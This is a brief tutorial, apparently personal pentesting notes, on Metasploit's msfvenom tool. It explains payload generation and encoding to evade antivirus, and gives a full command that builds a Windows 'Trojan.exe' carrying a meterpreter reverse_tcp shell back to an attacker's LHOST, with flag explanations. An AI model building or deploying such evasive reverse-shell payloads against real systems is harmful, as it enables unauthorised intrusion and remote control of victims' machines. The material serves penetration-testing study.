`   msfvenom` is a tool from the Metasploit Framework designed for generating and encoding payloads. It combines the functionality of the previous standalone tools `msfpayload` and `msfencode`, making it easier to create custom payloads, shellcodes, and to encode these in various formats to avoid detection by security software. Example of Usage:

- *Payload Generation*: `msfvenom` can create payloads for a wide range of platforms and situations, including Windows, Linux, Android, and more. These payloads can be used for exploitation, opening backdoors, or executing specific tasks on the target system.
    
- *Format Conversion*: It allows you to output the generated payload in different formats suitable for various scenarios, such as executables, scripts, or even raw shellcode.
    
- *Encoding and Obfuscation*: `msfvenom` can encode payloads to evade antivirus and intrusion detection systems. This process disguises the payload, making it harder for security systems to detect malicious activity.
    
- *Customization*: Users can customize payloads to include specific commands, establish reverse connections, and more, tailoring the attack to their specific needs.
    

In essence, `msfvenom` is a powerful and versatile tool for creating and manipulating payloads.

**Example of creating Windows Trojan**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[local ip] LPORT=[local port] -e x86/shikata_ga_nai -f exe -o Trojan.exe
```

* -p = our payload to communicate the same with the listener (use the same payload with the listener in Exploit)
* -e = our Encoder (there several encoders, the encoder above is in the most use)
* -f = format (exe = windows binary file)
* -o = output (trojan.exe)

After running this code our Trojan will created.

*Payloads*
to list all of your payloads run
```bash
msfvenom -l payloads
```
*Encoders*
to list all of your encoders run 
```bash
msfvenom -l encoders
```
